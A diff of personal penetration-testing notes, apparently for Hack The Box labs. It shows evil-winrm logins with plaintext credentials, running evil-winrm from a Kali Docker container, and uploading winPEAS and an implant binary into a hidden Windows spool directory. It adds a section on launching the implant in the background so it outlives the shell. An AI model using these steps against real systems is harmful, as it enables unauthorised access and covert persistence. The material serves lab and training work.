@@ -24,15 +24,16 @@ evil-winrm -i 10.10.100.15 -u a-whitehat -p "bNdKVkjv3RR9ht"
 * I have had issues with `evil-winrm` running properly on non kali Linux distros such as Ubuntu.
 * One simple work around is to pull a Kali Docker image and utilize that&#x20;
 
-```
-sudo docker run --tty --interactive kalilinux/kali-rolling
-evil-winrm -i 172.16.2.5 -u 'DANTE.ADMIN\jbercov' -p mypass123
-```
+<pre><code>docker pull kalilinux/kali-rolling
+<strong>sudo docker run --tty --interactive kalilinux/kali-rolling
+</strong>evil-winrm -i 172.16.2.5 -u 'DANTE.ADMIN\jbercov' -p mypass123
+</code></pre>
 
 * copy files from host into evil-winrm docker container&#x20;
 
 ```
 sudo docker cp /opt/winPEASx64.exe 3faed2add6c3:/opt
+docker cp /home/ubuntu/Documents/htb/cicada/exploit/cicada.htb.exe bbf6c66e54c3:/opt
 ```
 
 ### evil-winrm Service enumeration
@@ -59,4 +60,12 @@ C:\Windows\rIiHdlwq.exe                                                         
 ```
 upload /opt/winPEASx64.exe 
 Info: Uploading /opt/winPEASx64.exe to C:\Windows\system32\spool\drivers\color\winPEASx64.exe
+```
+
+### WinRM Implant Execution
+
+* start your implant in the background so if your evil-winrm shell dies your implant will continue to run&#x20;
+
+```
+cmd.exe /c start /b C:\Windows\System32\spool\drivers\color\cicada.htb.exe
 ```
